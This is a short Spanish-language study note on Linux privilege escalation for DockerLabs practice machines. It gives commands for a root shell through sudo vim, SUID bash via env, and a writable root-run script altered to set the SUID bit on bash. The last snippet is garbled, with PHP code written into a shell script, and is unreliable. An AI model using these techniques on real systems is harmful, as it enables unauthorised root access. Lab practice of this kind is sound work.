- Tags : #escalada_privilegios #escalada #recursos #recursos_dockerlabs #gtfobins #tools #tools_escalada_privilegios

**Escalada de privilegios en linux mediante sudo**

**PSPY**: Para escalada de privilegios [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

**Recursos**: Maquina Trust
**gtfobins**: [https://gtfobins.org/](https://gtfobins.org/)  Utilizado para la escalada de privilegios de scripts mal configurados o binarios que permiten la elevación de privilegios.
Escalada mediante la ejecución de scripts con permisos elevados, así que haremos una enumeración de estos ficheros.  Buscamos *gtfobins* el binario y vamos al apartado sudo que es el que nos permite escalar a sudo.
```bash
sudo -l

#Tenemos permiso de ejecucion de vim con todos los privilegios
sudo -u 'root' /usr/bin/vim -c ':!/bin/bash'
```

**Escalada de privilegios en linux mediante la enumeración de binarios**
**Recurso**: Maquina Injection dockerlabs.es 

```bash
find / -perm -4000 2>/dev/null

#En gtfobins buscamos los binarios y vamos al apartado SUID

/usr/bin/env /bin/bash -p

```


**Escalada de privilegios mediante procesos corriendo en segundo plano**

**Recurso**: Maquina Balulero dockerlabs.es 

```bash

ps aux | grep root
#vemos que hay un script que se ejecua cada cierto tiempo y que puede ser modificado por el usuario al que escalamos lateralmente . Entonces modificamos el script para que active el bit SUID en la bash

echo "<?php exec(chmod u+s /bin/bash); ?>" > /opt/script.sh
```